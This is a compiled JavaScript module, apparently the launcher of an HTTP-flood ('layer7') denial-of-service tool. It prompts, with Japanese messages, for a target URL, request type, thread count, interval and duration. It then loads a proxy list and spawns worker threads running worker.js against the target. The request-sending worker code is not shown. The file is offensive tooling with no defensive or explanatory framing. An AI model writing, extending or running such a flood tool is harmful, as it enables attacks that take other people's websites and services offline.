"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.layer7 = layer7;
const worker_threads_1 = require("worker_threads");
const prompt_sync_1 = __importDefault(require("prompt-sync"));
const prompt = (0, prompt_sync_1.default)();
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
//import functions files
const sleep_1 = require("../util/sleep");
//colors
const lightCyan = '\x1b[38;5;87m';
const white = `\u001b[0m`;
function layer7() {
    return __awaiter(this, void 0, void 0, function* () {
        const proxySelect = prompt(`${lightCyan}proxy${white}[${lightCyan}ON${white}/${lightCyan}OFF${white}]> `);
        if (proxySelect !== "ON" && proxySelect !== "OFF") {
            console.log("proxyはONかOFFで選択してください。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        const targetUrl = prompt(`${lightCyan}targetUrl${white}> `);
        if (targetUrl === "" || !(targetUrl.startsWith("https://") || targetUrl.startsWith("http://"))) {
            console.log("targetUrlが無効です。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        const requestType = prompt(`${lightCyan}requestType${white}[${lightCyan}GET${white}/${lightCyan}POST${white}]> `);
        if (requestType !== "GET" && requestType !== "POST") {
            console.log("requestTypeはGETかPOSTで指定してください。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        const threads = parseInt(prompt(`${lightCyan}threads${white}> `));
        const interval = parseInt(prompt(`${lightCyan}interval${white}> `));
        const time = parseInt(prompt(`${lightCyan}time${white}> `));
        if (isNaN(threads) || isNaN(interval) || isNaN(time)) {
            console.log("threads, interval, timeのどれかが有効な数字ではありません。");
            yield (0, sleep_1.sleep)(3000);
            return;
        }
        let proxies = fs_1.default.readFileSync("proxies.txt", "utf-8").toString().split("\n");
        let currentThread = 0;
        const promises = [];
        for (let i = 0; i < threads; i++) {
            promises.push(new Promise((resolve, reject) => {
                currentThread++;
                const worker = new worker_threads_1.Worker(path_1.default.resolve(__dirname, "./worker.js"), {
                    workerData: {
                        targetUrl,
                        requestType,
                        proxySelect,
                        interval,
                        time,
                        threads,
                        proxies,
                        currentThread
                    }
                });
                worker.on("message", resolve);
                worker.on("error", reject);
                worker.on("exit", (code) => {
                    if (code !== 0) {
                        reject(new Error(`Worker stopped with exit code ${code}`));
                    }
                });
            }));
        }
        yield Promise.all(promises);
        process.stdin.resume();
    });
}
